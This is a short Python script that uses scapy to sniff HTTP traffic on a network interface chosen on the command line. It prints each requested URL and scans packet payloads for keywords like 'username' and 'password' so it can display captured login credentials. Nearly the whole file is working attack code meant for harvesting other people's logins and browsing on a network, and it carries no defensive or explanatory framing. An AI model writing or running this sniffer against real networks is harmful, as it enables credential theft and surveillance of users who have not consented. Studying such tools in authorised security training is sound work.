#!/usr/bin/env python
from scapy.layers import http
import scapy.all as scapy
import optparse

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-i", "--interface", dest="interface", help="Enter interface you want to sniff")
    (options, arguments) = parser.parse_args()
    if not options.interface:
        parser.error("[-] Please enter target interface, use --help for more info")
    return options.interface


def sniff(interface):
    # sniffing incoming packets and reading by process_sniffed_packets function
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packets ,filter='')


def sniff_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def sniff_login(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        list_of_names = ['uname', 'pass', 'username', 'password', 'login', 'signup', 'user']
        for item in list_of_names:
            if item in load:
                return load


def process_sniffed_packets(packet):
    if packet.haslayer(http.HTTPRequest):
        url = sniff_url(packet)
        print("[+] Http Requested >>> "+str(url))
        login_info = sniff_login(packet)
        if login_info:
            print("\n\nPossible Username and Password >>> " + login_info + "\n\n")


sniff(get_arguments())
